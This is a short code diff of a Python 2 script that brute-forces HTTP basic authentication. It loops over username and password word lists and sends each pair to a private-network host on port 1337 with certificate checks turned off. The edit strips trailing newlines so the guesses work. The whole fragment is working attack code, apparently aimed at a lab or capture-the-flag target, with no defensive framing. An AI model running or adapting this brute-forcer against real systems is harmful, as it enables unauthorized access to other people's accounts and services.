@@ -9,8 +9,8 @@ with open('usernames') as f1:
 	for line1 in f1:
 		with open('passwords') as f2:
 			for line2 in f2:
-				print "testing "+line1+":"+ line2
-				r = requests.get('https://192.168.130.184:1337/', auth=(line1, line2), verify=False)
+				print "testing "+line1.rstrip()+":"+ line2.rstrip()
+				r = requests.get('https://192.168.130.184:1337/', auth=(line1.rstrip(), line2.rstrip()), verify=False)
 				#without http, run the below uncomment the below code instead of the above one
 				#r = requests.get('https://192.168.130.184:1337/', auth=(line1, line2))
                                 if r.status_code != 401:
